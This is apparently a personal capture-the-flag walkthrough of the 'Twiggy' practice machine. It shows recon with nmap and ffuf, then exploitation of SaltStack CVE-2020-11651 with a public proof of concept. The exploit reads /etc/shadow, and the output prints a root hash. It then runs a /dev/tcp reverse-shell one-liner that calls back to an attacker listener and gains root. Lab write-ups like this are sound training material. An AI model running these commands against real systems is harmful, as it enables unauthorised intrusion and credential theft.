No credentials were provided for this machine

nmap -vvv -T5 -Pn 192.168.224.62 -p- -A -oN nmap.txt

sudo echo "192.168.224.62 twiggy.pg" | sudo tee -a /etc/hosts

http://twiggy.pg/
view-source:http://twiggy.pg/

http://twiggy.pg/admin/login/?next=/admin/

Mezzanine
http://mezzanine.jupo.org/docs/content-architecture.html

mezzanine jupo github

https://github.com/stephenmcd/mezzanine

mezzanine cms default credentials

mezzanine cms exploit github

https://nvd.nist.gov/vuln/detail/CVE-2025-6050

http://twiggy.pg/static/media/uploads/

ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://twiggy.pg/FUZZ

ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://twiggy.pg/static/media/uploads/FUZZ

ffuf -w /usr/share/seclists/Discovery/DNS/combined_subdomains.txt -H "Host: FUZZ.twiggy.pg" -u http://twiggy.pg/ -fs 6927

http://twiggy.pg:8000/

{"clients": ["local", "local_async", "local_batch", "local_subset", "runner", "runner_async", "ssh", "wheel", "wheel_async"], "return": "Welcome"}

curl -i 192.168.224.62:8000

X-Upstream: salt-api/3000-1

https://www.google.com/search?client=firefox-b-e&channel=entpr&q={"clients"%3A+["local"%2C+"local_async"%2C+"local_batch"%2C+"local_subset"%2C+"runner"%2C+"runner_async"%2C+"ssh"%2C+"wheel"%2C+"wheel_async"]%2C+"return"%3A+"Welcome"}

https://github.com/vmware-archive/salt-api/issues/180

https://www.exploit-db.com/exploits/48421

CVE : CVE-2020-11651 and CVE-2020-11652

https://github.com/jasperla/CVE-2020-11651-poc

┌──(lepotekil㉿kali)-[~/proving-ground-prac/twiggy]
└─$ sudo python3 exploit.py --master 192.168.224.62 -r /etc/shadow
[!] Please only use this script to verify you have correctly patched systems you have permission to access. Hit ^C to abort.
[+] Checking salt-master (192.168.224.62:4506) status... ONLINE
[+] Checking if vulnerable to CVE-2020-11651... YES
[*] root key obtained: MM+k7kuD8qK7uY/FCqn+L+gPc6ScqcoJBfVShUUA3KGay3i/woG7skNXpMmON4009lLtSZ9DRlk=
[+] Attemping to read /etc/shadow from 192.168.224.62
root:$6$WT0RuvyM$WIZ6pBFcP7G4pz/jRYY/LBsdyFGIiP3SLl0p32mysET9sBMeNkDXXq52becLp69Q/Uaiu8H0GxQ31XjA8zImo/:18400:0:99999:7:::
...

4444, and other doesn't work, only openned port work.

┌──(lepotekil㉿kali)-[~/proving-ground-prac/twiggy]
└─$ sudo python3 exploit.py --master 192.168.224.62 --exec "sh -i >& /dev/tcp/192.168.45.170/4505 0>&1"
[!] Please only use this script to verify you have correctly patched systems you have permission to access. Hit ^C to abort.
[+] Checking salt-master (192.168.224.62:4506) status... ONLINE
[+] Checking if vulnerable to CVE-2020-11651... YES
[*] root key obtained: MM+k7kuD8qK7uY/FCqn+L+gPc6ScqcoJBfVShUUA3KGay3i/woG7skNXpMmON4009lLtSZ9DRlk=
[+] Attemping to execute sh -i >& /dev/tcp/192.168.45.170/4505 0>&1 on 192.168.224.62
[+] Successfully scheduled job: 20251017191045944538

┌──(lepotekil㉿kali)-[~/proving-ground-prac/twiggy]
└─$ nc -lvnp 4505
listening on [any] 4505 ...
connect to [192.168.45.170] from (UNKNOWN) [192.168.224.62] 37298
sh: no job control in this shell
sh-4.2# ls
ls
proof.txt
sh-4.2# cat proof.txt
cat proof.txt
02ec21c1d272dd25558f5c91877b56de
sh-4.2#